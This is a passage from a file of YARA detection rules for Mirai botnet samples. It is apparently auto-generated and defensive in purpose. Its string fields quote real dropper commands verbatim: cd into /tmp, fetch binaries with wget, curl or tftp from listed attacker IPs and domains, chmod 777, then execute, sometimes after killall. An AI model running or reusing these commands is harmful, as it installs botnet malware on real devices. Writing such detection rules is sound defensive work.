      hash1 = "8555eff282e97266ce61c36f63a8c959f1ddbca46b45b4dc91cfe8733ba09e2a"
   strings:
      $s1 = "cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://160.187.229.191/hiddenbin/Space.arm; curl -O http://160.187.2" ascii /* score: '30.00'*/
      $s2 = "cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://160.187.229.191/hiddenbin/Space.arc; curl -O http://160.187.2" ascii /* score: '30.00'*/
      $s3 = "cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://160.187.229.191/hiddenbin/Space.ppc; curl -O http://160.187.2" ascii /* score: '30.00'*/
      $s4 = "cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://160.187.229.191/hiddenbin/Space.arc; curl -O http://160.187.2" ascii /* score: '29.00'*/
      $s5 = "cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://160.187.229.191/hiddenbin/Space.arm; curl -O http://160.187.2" ascii /* score: '29.00'*/
      $s6 = "cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://160.187.229.191/hiddenbin/Space.ppc; curl -O http://160.187.2" ascii /* score: '29.00'*/
      $s7 = "cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://160.187.229.191/hiddenbin/Space.x86_64; curl -O http://160.18" ascii /* score: '27.00'*/
      $s8 = "cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://160.187.229.191/hiddenbin/Space.sh4; curl -O http://160.187.2" ascii /* score: '27.00'*/
      $s9 = "cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://160.187.229.191/hiddenbin/Space.arm6; curl -O http://160.187." ascii /* score: '27.00'*/
      $s10 = "cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://160.187.229.191/hiddenbin/Space.mpsl; curl -O http://160.187." ascii /* score: '27.00'*/
      $s11 = "cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://160.187.229.191/hiddenbin/Space.arm5; curl -O http://160.187." ascii /* score: '27.00'*/
      $s12 = "cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://160.187.229.191/hiddenbin/Space.sparc; curl -O http://160.187" ascii /* score: '27.00'*/
      $s13 = "cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://160.187.229.191/hiddenbin/Space.i686; curl -O http://160.187." ascii /* score: '27.00'*/
      $s14 = "cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://160.187.229.191/hiddenbin/Space.mips64; curl -O http://160.18" ascii /* score: '27.00'*/
      $s15 = "cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://160.187.229.191/hiddenbin/Space.arm7; curl -O http://160.187." ascii /* score: '27.00'*/
   condition:
      uint16(0) == 0x2123 and filesize < 8KB and
      8 of them
}

rule Mirai_signature__8685d866 {
   meta:
      description = "_subset_batch - file Mirai(signature)_8685d866.sh"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-28"
      hash1 = "8685d86699fdd9033a93aacc2c2ad2472f325004d6a0b4d1985b754cb302405b"
   strings:
      $s1 = "wget http://bighaj.de/arm4; chmod 777 arm4; ./arm4 faith" fullword ascii /* score: '15.00'*/
      $s2 = "wget http://bighaj.de/arm6; chmod 777 arm6; ./arm6 faith" fullword ascii /* score: '15.00'*/
      $s3 = "wget http://bighaj.de/arm7; chmod 777 arm7; ./arm7 faith" fullword ascii /* score: '15.00'*/
      $s4 = "wget http://bighaj.de/mpsl; chmod 777 mpsl; ./mpsl faith" fullword ascii /* score: '15.00'*/
      $s5 = "wget http://bighaj.de/x86; chmod 777 x86; ./x86 faith" fullword ascii /* score: '15.00'*/
      $s6 = "wget http://bighaj.de/mips; chmod 777 mips; ./mips faith" fullword ascii /* score: '15.00'*/
      $s7 = "wget http://bighaj.de/arm5; chmod 777 arm5; ./arm5 faith" fullword ascii /* score: '15.00'*/
   condition:
      uint16(0) == 0x6777 and filesize < 1KB and
      all of them
}

rule Mirai_signature__86d61e39 {
   meta:
      description = "_subset_batch - file Mirai(signature)_86d61e39.unknown"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-28"
      hash1 = "86d61e395cc8c555f2f7eb550fc9a40f1daacc12102f53cf792de16afcd85cad"
   strings:
      $s1 = "wget http://$IP/arm5;chmod 777 arm5;./arm5 dvr.arm5;rm -rf arm5;" fullword ascii /* score: '19.00'*/
      $s2 = "wget http://$IP/arm6;chmod 777 arm6;./arm6 dvr.arm6;rm -rf arm6;" fullword ascii /* score: '19.00'*/
      $s3 = "wget http://$IP/arm7;chmod 777 arm7;./arm7 dvr.arm7;rm -rf arm7;" fullword ascii /* score: '19.00'*/
   condition:
      uint16(0) == 0x5049 and filesize < 1KB and
      all of them
}

rule Mirai_signature__878cae9e {
   meta:
      description = "_subset_batch - file Mirai(signature)_878cae9e.elf"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-28"
      hash1 = "878cae9e60595eaaffa0537c0fc4eb8e4f3c3696c3b6cf72c7f115051c9ae689"
   strings:
      $s1 = "UPX-5.0 wants memfd_create(), or needs /dev/shm(,O_TMPFILE,)" fullword ascii /* score: '11.00'*/
   condition:
      uint16(0) == 0x457f and filesize < 90KB and
      all of them
}

rule Mirai_signature__8a6bd806 {
   meta:
      description = "_subset_batch - file Mirai(signature)_8a6bd806.elf"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-28"
      hash1 = "8a6bd806dc90ec549af058c86d040f376a0a15de8a9830f91ac4b1483351fde5"
   strings:
      $s1 = "840,($" fullword ascii /* reversed goodware string '$(,048' */ /* score: '11.00'*/
   condition:
      uint16(0) == 0x457f and filesize < 100KB and
      all of them
}

rule Mirai_signature__a6e1232d {
   meta:
      description = "_subset_batch - file Mirai(signature)_a6e1232d.elf"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-28"
      hash1 = "a6e1232d124372fbb7b2a90f8db7a03ba3f712574c86a3f1aa36d9884adf40bd"
   strings:
      $s1 = "/vp/.sys" fullword ascii /* score: '16.00'*/
      $s2 = "UPX-5.0 wants memfd_create(), or needs /dev/shm(,O_TMPFILE,)" fullword ascii /* score: '11.00'*/
      $s3 = "(0123456789ABCDEF-+ " fullword ascii /* score: '8.00'*/
   condition:
      uint16(0) == 0x457f and filesize < 100KB and
      all of them
}

rule Mirai_signature__aa5c0ea7 {
   meta:
      description = "_subset_batch - file Mirai(signature)_aa5c0ea7.elf"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-28"
      hash1 = "aa5c0ea78ca37ec005dd9663dfed9108c5055a94ef5117763dc10bb6ed632dbd"
   strings:
      $s1 = "UPX-5.0 wants memfd_create(), or needs /dev/shm(,O_TMPFILE,)" fullword ascii /* score: '11.00'*/
      $s2 = "mp/.sys(v[" fullword ascii /* score: '8.00'*/
      $s3 = "livetime" fullword ascii /* score: '8.00'*/
   condition:
      uint16(0) == 0x457f and filesize < 100KB and
      all of them
}

rule Mirai_signature__88ad168c {
   meta:
      description = "_subset_batch - file Mirai(signature)_88ad168c.sh"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-28"
      hash1 = "88ad168cd9ba2d85e85504a20f569a81ea0d207cd5ca22bc926d416392f19486"
   strings:
      $s1 = "    cd /tmp || cd /var/run || cd /mnt || cd /root || cd /;wget -O newcron http://103.77.241.144/huhu/titanjr.$a || curl -O newcr" ascii /* score: '29.00'*/
      $s2 = "on http://103.77.241.144/huhu/titanjr.$a || busybox wget -O newcron http://103.77.241.144/huhu/titanjr.$a || busybox ftpget -v -" ascii /* score: '25.00'*/
      $s3 = "ewcron || tftp 103.77.241.144 -c get titanjr.$a -o newcron || tftp -r titanjr.$a -g 103.77.241.144 -l newcron;chmod 777 newcron;" ascii /* score: '25.00'*/
      $s4 = "busybox tftp -r titanjr.$a -g 103.77.241.144 -l newcron || ftpget -v -u anonymous -p anonymous -P 21 103.77.241.144 titanjr.$a n" ascii /* score: '22.00'*/
      $s5 = "    cd /tmp || cd /var/run || cd /mnt || cd /root || cd /;wget -O newcron http://103.77.241.144/huhu/titanjr.$a || curl -O newcr" ascii /* score: '22.00'*/
      $s6 = "u anonymous -p anonymous -P 21 103.77.241.144 titanjr.$a newcron || busybox tftp 103.77.241.144 -c get titanjr.$a -o newcron || " ascii /* score: '22.00'*/
   condition:
      uint16(0) == 0x2123 and filesize < 2KB and
      all of them
}

rule Mirai_signature__8cdc0c6e {
   meta:
      description = "_subset_batch - file Mirai(signature)_8cdc0c6e.sh"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-28"
      hash1 = "8cdc0c6e958f7ad61907371237dc9a3c442b48bfdafd8e362e77b8d1502b0b99"
   strings:
      $s1 = "wget http://103.153.69.151/x86; chmod 777 x86; ./x86 telnet" fullword ascii /* score: '20.00'*/
      $s2 = "wget http://103.153.69.151/arm5; chmod 777 arm5; ./arm5 telnet" fullword ascii /* score: '20.00'*/
      $s3 = "wget http://103.153.69.151/mpsl; chmod 777 mpsl; ./mpsl telnet" fullword ascii /* score: '20.00'*/
      $s4 = "wget http://103.153.69.151/arm6; chmod 777 arm6; ./arm6 telnet" fullword ascii /* score: '20.00'*/
      $s5 = "wget http://103.153.69.151/mips; chmod 777 mips; ./mips telnet" fullword ascii /* score: '20.00'*/
      $s6 = "wget http://103.153.69.151/arm7; chmod 777 arm7; ./arm7 telnet" fullword ascii /* score: '20.00'*/
      $s7 = "wget http://103.153.69.151/arm4; chmod 777 arm4; ./arm4 telnet" fullword ascii /* score: '20.00'*/
   condition:
      uint16(0) == 0x6777 and filesize < 1KB and
      all of them
}

rule Mirai_signature__90bab043 {
   meta:
      description = "_subset_batch - file Mirai(signature)_90bab043.sh"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-28"
      hash1 = "90bab0433b3121b587082f8dd1ac5ccac5c115566a8f780071d3926ab3d505ba"
   strings:
      $s1 = "curl http://161.97.106.129/systemcl/arm6; chmod 777 arm6; ./arm6 arm6" fullword ascii /* score: '18.00'*/
      $s2 = "curl http://161.97.106.129/systemcl/mpsl; chmod 777 mpsl; ./mpsl mpsl" fullword ascii /* score: '18.00'*/
      $s3 = "curl http://161.97.106.129/systemcl/sh4; chmod 777 sh4; ./sh4 sh4" fullword ascii /* score: '18.00'*/
      $s4 = "curl http://161.97.106.129/systemcl/x86; chmod 777 x86; ./x86 x86" fullword ascii /* score: '18.00'*/
      $s5 = "curl http://161.97.106.129/systemcl/m68k; chmod 777 m68k; ./m68k m68k" fullword ascii /* score: '18.00'*/
      $s6 = "curl http://161.97.106.129/systemcl/arm; chmod 777 arm; ./arm arm" fullword ascii /* score: '18.00'*/
      $s7 = "curl http://161.97.106.129/systemcl/arm5; chmod 777 arm5; ./arm5 arm5" fullword ascii /* score: '18.00'*/
      $s8 = "curl http://161.97.106.129/systemcl/mips; chmod 777 mips; ./mips mips" fullword ascii /* score: '18.00'*/
      $s9 = "curl http://161.97.106.129/systemcl/ppc; chmod 777 ppc; ./ppc ppc" fullword ascii /* score: '18.00'*/
      $s10 = "curl http://161.97.106.129/systemcl/x86_64; chmod 777 x86_64; ./x86_64 x86_64" fullword ascii /* score: '18.00'*/
      $s11 = "curl http://161.97.106.129/systemcl/spc; chmod 777 spc; ./spc spc" fullword ascii /* score: '18.00'*/
      $s12 = "curl http://161.97.106.129/systemcl/arm7; chmod 777 arm7; ./arm7 arm7" fullword ascii /* score: '18.00'*/
   condition:
      uint16(0) == 0x7563 and filesize < 2KB and
      8 of them
}

rule Mirai_signature__913ff4be {
   meta:
      description = "_subset_batch - file Mirai(signature)_913ff4be.sh"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-28"
      hash1 = "913ff4bef54a41df8b00245bc556baea9a41ee32a386cdd0e34470641bb69f6f"
   strings:
      $s1 = "wget http://42.112.26.45/m/moobs" fullword ascii /* score: '17.00'*/
      $s2 = "wget http://42.112.26.45/m/mpsl" fullword ascii /* score: '17.00'*/
      $s3 = "wget http://42.112.26.45/m/arm4" fullword ascii /* score: '17.00'*/
      $s4 = "wget http://42.112.26.45/m/arm7" fullword ascii /* score: '17.00'*/
      $s5 = "wget http://42.112.26.45/m/arm5" fullword ascii /* score: '17.00'*/
      $s6 = "./mpsl matos.rshell" fullword ascii /* score: '9.00'*/
      $s7 = "./arm4 matos.rshell" fullword ascii /* score: '9.00'*/
      $s8 = "./arm7 matos.rshell" fullword ascii /* score: '9.00'*/
      $s9 = "./moobs matos.rshell" fullword ascii /* score: '9.00'*/
      $s10 = "./arm5 matos.rshell" fullword ascii /* score: '9.00'*/
      $s11 = "rm -rf moobs mpsl arm4 arm5 arm7" fullword ascii /* score: '8.00'*/
   condition:
      uint16(0) == 0x6d72 and filesize < 1KB and
      8 of them
}

rule Mirai_signature__91b6a84b {
   meta:
      description = "_subset_batch - file Mirai(signature)_91b6a84b.sh"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-28"
      hash1 = "91b6a84b79692bb78369bedabd240cffb99d4749911b3b36c8b880e6dbffcacc"
   strings:
      $s1 = "wget http://103.252.89.226/bins/morte.arc -O morte.arc" fullword ascii /* score: '27.00'*/
      $s2 = "wget http://103.252.89.226/bins/morte.spc -O morte.spc" fullword ascii /* score: '27.00'*/
      $s3 = "wget http://103.252.89.226/bins/morte.arm -O morte.arm" fullword ascii /* score: '27.00'*/
      $s4 = "wget http://103.252.89.226/bins/morte.ppc -O morte.ppc" fullword ascii /* score: '27.00'*/
      $s5 = "curl -o morte.ppc http://103.252.89.226/bins/morte.ppc" fullword ascii /* score: '26.00'*/
      $s6 = "curl -o morte.spc http://103.252.89.226/bins/morte.spc" fullword ascii /* score: '26.00'*/
      $s7 = "curl -o morte.arc http://103.252.89.226/bins/morte.arc" fullword ascii /* score: '26.00'*/
      $s8 = "curl -o morte.arm http://103.252.89.226/bins/morte.arm" fullword ascii /* score: '26.00'*/
      $s9 = "wget http://103.252.89.226/bins/morte.arm5 -O morte.arm5" fullword ascii /* score: '24.00'*/
      $s10 = "wget http://103.252.89.226/bins/morte.arm7 -O morte.arm7" fullword ascii /* score: '24.00'*/
      $s11 = "wget http://103.252.89.226/bins/morte.mpsl -O morte.mpsl" fullword ascii /* score: '24.00'*/
      $s12 = "wget http://103.252.89.226/bins/morte.m68k -O morte.m68k" fullword ascii /* score: '24.00'*/
      $s13 = "wget http://103.252.89.226/bins/morte.mips -O morte.mips" fullword ascii /* score: '24.00'*/
      $s14 = "wget http://103.252.89.226/bins/morte.sh4 -O morte.sh4" fullword ascii /* score: '24.00'*/
      $s15 = "wget http://103.252.89.226/bins/morte.x86_64 -O morte.x86_64" fullword ascii /* score: '24.00'*/
   condition:
      uint16(0) == 0x2123 and filesize < 7KB and
      8 of them
}

rule Mirai_signature__95f716bc {
   meta:
      description = "_subset_batch - file Mirai(signature)_95f716bc.sh"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-28"
      hash1 = "95f716bc6b708400e3d2093c3a65615e482d5ec51e803b2c9e4cbfc075b5ce0b"
   strings:
      $s1 = "cd /tmp; wget http://94.154.35.154/mipsel.urbotnetisass; curl -O http://94.154.35.154/mipsel.urbotnetisass; chmod 777 mipsel.urb" ascii /* score: '30.00'*/
      $s2 = "cd /tmp; wget http://94.154.35.154/arm5.urbotnetisass; curl -O http://94.154.35.154/arm5.urbotnetisass; chmod 777 arm5.urbotneti" ascii /* score: '27.00'*/
      $s3 = "cd /tmp; wget http://94.154.35.154/arm6.urbotnetisass; curl -O http://94.154.35.154/arm6.urbotnetisass; chmod 777 arm6.urbotneti" ascii /* score: '27.00'*/
      $s4 = "cd /tmp; wget http://94.154.35.154/m68k.urbotnetisass; curl -O http://94.154.35.154/m68k.urbotnetisass; chmod 777 m68k.urbotneti" ascii /* score: '27.00'*/
      $s5 = "cd /tmp; wget http://94.154.35.154/arm.urbotnetisass; curl -O http://94.154.35.154/arm.urbotnetisass; chmod 777 arm.urbotnetisas" ascii /* score: '27.00'*/
      $s6 = "cd /tmp; wget http://94.154.35.154/m68k.urbotnetisass; curl -O http://94.154.35.154/m68k.urbotnetisass; chmod 777 m68k.urbotneti" ascii /* score: '27.00'*/
      $s7 = "cd /tmp; wget http://94.154.35.154/powerpc.urbotnetisass; curl -O http://94.154.35.154/powerpc.urbotnetisass; chmod 777 powerpc." ascii /* score: '27.00'*/
      $s8 = "cd /tmp; wget http://94.154.35.154/sh4.urbotnetisass; curl -O http://94.154.35.154/sh4.urbotnetisass; chmod 777 sh4.urbotnetisas" ascii /* score: '27.00'*/
      $s9 = "cd /tmp; wget http://94.154.35.154/powerpc.urbotnetisass; curl -O http://94.154.35.154/powerpc.urbotnetisass; chmod 777 powerpc." ascii /* score: '27.00'*/
      $s10 = "cd /tmp; wget http://94.154.35.154/mips.urbotnetisass; curl -O http://94.154.35.154/mips.urbotnetisass; chmod 777 mips.urbotneti" ascii /* score: '27.00'*/
      $s11 = "cd /tmp; wget http://94.154.35.154/arm6.urbotnetisass; curl -O http://94.154.35.154/arm6.urbotnetisass; chmod 777 arm6.urbotneti" ascii /* score: '27.00'*/
      $s12 = "cd /tmp; wget http://94.154.35.154/sparc.urbotnetisass; curl -O http://94.154.35.154/sparc.urbotnetisass; chmod 777 sparc.urbotn" ascii /* score: '27.00'*/
      $s13 = "cd /tmp; wget http://94.154.35.154/sh4.urbotnetisass; curl -O http://94.154.35.154/sh4.urbotnetisass; chmod 777 sh4.urbotnetisas" ascii /* score: '27.00'*/
      $s14 = "cd /tmp; wget http://94.154.35.154/arm5.urbotnetisass; curl -O http://94.154.35.154/arm5.urbotnetisass; chmod 777 arm5.urbotneti" ascii /* score: '27.00'*/
      $s15 = "cd /tmp; wget http://94.154.35.154/arm.urbotnetisass; curl -O http://94.154.35.154/arm.urbotnetisass; chmod 777 arm.urbotnetisas" ascii /* score: '27.00'*/
   condition:
      uint16(0) == 0x2123 and filesize < 5KB and
      8 of them
}

rule Mirai_signature__96f8a569 {
   meta:
      description = "_subset_batch - file Mirai(signature)_96f8a569.sh"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-28"
      hash1 = "96f8a5692f42fea71b1cdc9be2e46f19e15759a4cbc10088d7695411e519c109"
   strings:
      $s1 = "killall -9 arm4; killall -9 arm4.s; cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://196.251.72.101/z/89/arm4;" ascii /* score: '30.00'*/
      $s2 = "killall -9 x86_64; killall -9 x86_64.s; cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://196.251.72.101/z/89/x" ascii /* score: '30.00'*/
      $s3 = "killall -9 mips; killall -9 mips.s; cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://196.251.72.101/z/89/mips;" ascii /* score: '30.00'*/
      $s4 = "killall -9 arm5; killall -9 arm5.s; cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://196.251.72.101/z/89/arm5;" ascii /* score: '30.00'*/
      $s5 = "killall -9 arm6; killall -9 arm6.s; cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://196.251.72.101/z/89/arm6;" ascii /* score: '30.00'*/
      $s6 = "killall -9 arm7; killall -9 arm7.s; cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://196.251.72.101/z/89/arm7;" ascii /* score: '30.00'*/
      $s7 = "killall -9 mpsl; killall -9 mpsl.s; cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://196.251.72.101/z/89/mpsl;" ascii /* score: '30.00'*/
      $s8 = "/bin/busybox tftp -g -r arm4/196.251.72.101/z/89 69; chmod 777 arm4; ./arm4 cn" fullword ascii /* score: '28.00'*/
      $s9 = "/bin/busybox tftp -g -r x86_64/196.251.72.101/z/89 69; chmod 777 x86_64; ./x86_64 cn" fullword ascii /* score: '28.00'*/
      $s10 = "/bin/busybox tftp -g -r arm5/196.251.72.101/z/89 69; chmod 777 arm5; ./arm5 cn" fullword ascii /* score: '28.00'*/
      $s11 = "/bin/busybox tftp -g -r mpsl/196.251.72.101/z/89 69; chmod 777 mpsl; ./mpsl cn" fullword ascii /* score: '28.00'*/
      $s12 = "/bin/busybox tftp -g -r arm7/196.251.72.101/z/89 69; chmod 777 arm7; ./arm7 cn" fullword ascii /* score: '28.00'*/
      $s13 = "/bin/busybox tftp -g -r arm6/196.251.72.101/z/89 69; chmod 777 arm6; ./arm6 cn" fullword ascii /* score: '28.00'*/
      $s14 = "/bin/busybox tftp -g -r mips/196.251.72.101/z/89 69; chmod 777 mips; ./mips cn" fullword ascii /* score: '28.00'*/
      $s15 = "killall -9 arm4; killall -9 arm4.s; cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://196.251.72.101/z/89/arm4;" ascii /* score: '27.00'*/
   condition:
      uint16(0) == 0x0a20 and filesize < 10KB and
      8 of them
}

rule Mirai_signature__a60c3a89 {
   meta:
      description = "_subset_batch - file Mirai(signature)_a60c3a89.unknown"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-28"
      hash1 = "a60c3a89f53fc05959ac24b378485e21fcd1d937345bdf573c57c620ab07e4f1"
   strings:
      $s1 = "                <value>rm UnHAnaAW.x86; curl --output UnHAnaAW.x86 http://89.144.20.51/UnHAnaAW.x86; wget http://89.144.20.51/Un" ascii /* score: '19.00'*/
      $s2 = "                <value>rm UnHAnaAW.x86; curl --output UnHAnaAW.x86 http://89.144.20.51/UnHAnaAW.x86; wget http://89.144.20.51/Un" ascii /* score: '16.00'*/
      $s3 = "<beans xmlns=\"http://www.springframework.org/schema/beans\"" fullword ascii /* score: '13.00'*/
   condition:
      uint16(0) == 0x623c and filesize < 2KB and
      all of them
}

rule Mirai_signature__9fb12cad {
   meta:
      description = "_subset_batch - file Mirai(signature)_9fb12cad.sh"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-28"
      hash1 = "9fb12cadd426f5a3559ef0bd846559c539fea7e7fa4b79424214247e51fa65a2"
   strings:
      $x1 = "cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://103.77.241.144/0010101010100101101010111010101011010101110101" ascii /* score: '33.00'*/
      $x2 = "cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://103.77.241.144/0010101010100101101010111010101011010101110101" ascii /* score: '33.00'*/
      $x3 = "cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://103.77.241.144/0010101010100101101010111010101011010101110101" ascii /* score: '33.00'*/
      $x4 = "cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://103.77.241.144/0010101010100101101010111010101011010101110101" ascii /* score: '33.00'*/
      $s5 = "cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://103.77.241.144/0010101010100101101010111010101011010101110101" ascii /* score: '30.00'*/
      $s6 = "cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://103.77.241.144/0010101010100101101010111010101011010101110101" ascii /* score: '30.00'*/
      $s7 = "cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://103.77.241.144/0010101010100101101010111010101011010101110101" ascii /* score: '30.00'*/
      $s8 = "cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://103.77.241.144/0010101010100101101010111010101011010101110101" ascii /* score: '30.00'*/
      $s9 = "cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://103.77.241.144/0010101010100101101010111010101011010101110101" ascii /* score: '30.00'*/
      $s10 = "cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://103.77.241.144/0010101010100101101010111010101011010101110101" ascii /* score: '30.00'*/
      $s11 = "cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://103.77.241.144/0010101010100101101010111010101011010101110101" ascii /* score: '30.00'*/
      $s12 = "cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://103.77.241.144/0010101010100101101010111010101011010101110101" ascii /* score: '30.00'*/
      $s13 = "cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://103.77.241.144/0010101010100101101010111010101011010101110101" ascii /* score: '30.00'*/
      $s14 = "cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://103.77.241.144/0010101010100101101010111010101011010101110101" ascii /* score: '30.00'*/
      $s15 = "cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://103.77.241.144/0010101010100101101010111010101011010101110101" ascii /* score: '30.00'*/
   condition:
      uint16(0) == 0x2123 and filesize < 20KB and
      1 of ($x*) and all of them
}

rule Mirai_signature__b0a5560a {
   meta:
      description = "_subset_batch - file Mirai(signature)_b0a5560a.sh"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-28"
      hash1 = "b0a5560a5bc5d0bc6cbc1aadb14b10123ce39bb7d06a18d05ac4947e1c216710"
   strings:
      $x1 = "cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://160.187.246.158/001010101010010110101011101010101101010111010" ascii /* score: '33.00'*/
      $x2 = "cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://160.187.246.158/001010101010010110101011101010101101010111010" ascii /* score: '33.00'*/
      $x3 = "cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://160.187.246.158/001010101010010110101011101010101101010111010" ascii /* score: '33.00'*/
      $x4 = "cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://160.187.246.158/001010101010010110101011101010101101010111010" ascii /* score: '33.00'*/
      $s5 = "cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://160.187.246.158/001010101010010110101011101010101101010111010" ascii /* score: '30.00'*/
      $s6 = "cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://160.187.246.158/001010101010010110101011101010101101010111010" ascii /* score: '30.00'*/
      $s7 = "cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://160.187.246.158/001010101010010110101011101010101101010111010" ascii /* score: '30.00'*/
      $s8 = "cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://160.187.246.158/001010101010010110101011101010101101010111010" ascii /* score: '30.00'*/
      $s9 = "cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://160.187.246.158/001010101010010110101011101010101101010111010" ascii /* score: '30.00'*/
      $s10 = "cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://160.187.246.158/001010101010010110101011101010101101010111010" ascii /* score: '30.00'*/
      $s11 = "cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://160.187.246.158/001010101010010110101011101010101101010111010" ascii /* score: '30.00'*/
      $s12 = "cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://160.187.246.158/001010101010010110101011101010101101010111010" ascii /* score: '30.00'*/
      $s13 = "cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://160.187.246.158/001010101010010110101011101010101101010111010" ascii /* score: '30.00'*/
      $s14 = "cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://160.187.246.158/001010101010010110101011101010101101010111010" ascii /* score: '30.00'*/
      $s15 = "cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://160.187.246.158/001010101010010110101011101010101101010111010" ascii /* score: '30.00'*/
   condition:
      uint16(0) == 0x2123 and filesize < 20KB and
      1 of ($x*) and all of them
}

rule Mirai_signature__a006059a {
   meta:
      description = "_subset_batch - file Mirai(signature)_a006059a.sh"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-28"
      hash1 = "a006059abe53e52d80d5c171a1a23f1220d78804022464293be79ef4388bd35c"
   strings:
      $s1 = "busybox wget http://$server_ip//$binname.$arch -O $execname" fullword ascii /* score: '27.00'*/
      $s2 = "rm -rf $execname" fullword ascii /* score: '16.00'*/
      $s3 = "chmod 777 $execname" fullword ascii /* score: '12.00'*/
      $s4 = "./$execname $1" fullword ascii /* score: '12.00'*/
      $s5 = "execname=\"twix.LG\"" fullword ascii /* score: '12.00'*/
      $s6 = "server_ip=\"109.205.213.5\"" fullword ascii /* score: '9.00'*/
      $s7 = "cd /tmp" fullword ascii /* score: '8.00'*/
   condition:
      uint16(0) == 0x6962 and filesize < 1KB and
      all of them
}

rule Mirai_signature__a0f5f3e3 {
   meta:
      description = "_subset_batch - file Mirai(signature)_a0f5f3e3.elf"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-28"
      hash1 = "a0f5f3e381c4ba2d24e8df2d66e590ad3b9e676d22b6fb74c19ef52cef695dfc"
   strings:
      $s1 = "-SEARCH * HTTP/1" fullword ascii /* score: '11.00'*/
   condition:
      uint16(0) == 0x457f and filesize < 60KB and
      all of them
}

rule Mirai_signature__af426bab {
   meta:
      description = "_subset_batch - file Mirai(signature)_af426bab.elf"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-28"
      hash1 = "af426babc8e24f4cb6cbf35167828d4d3eb055d2529da0768417271adea126f9"
   strings:
      $s1 = ":xsvr@M-SEARCH * HTTP" fullword ascii /* score: '11.00'*/
   condition:
      uint16(0) == 0x457f and filesize < 60KB and
      all of them
}

rule Mirai_signature__a607b3d8 {
   meta:
      description = "_subset_batch - file Mirai(signature)_a607b3d8.sh"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-28"
      hash1 = "a607b3d80f2636dc75e3d09b82ce6bb78e558346f03edb8375240a4c850017a3"
   strings:
      $s1 = "cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://163.227.230.253/hiddenbin/boatnet.spc; curl -O http://163.227" ascii /* score: '30.00'*/
      $s2 = "cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://163.227.230.253/hiddenbin/boatnet.ppc; curl -O http://163.227" ascii /* score: '30.00'*/
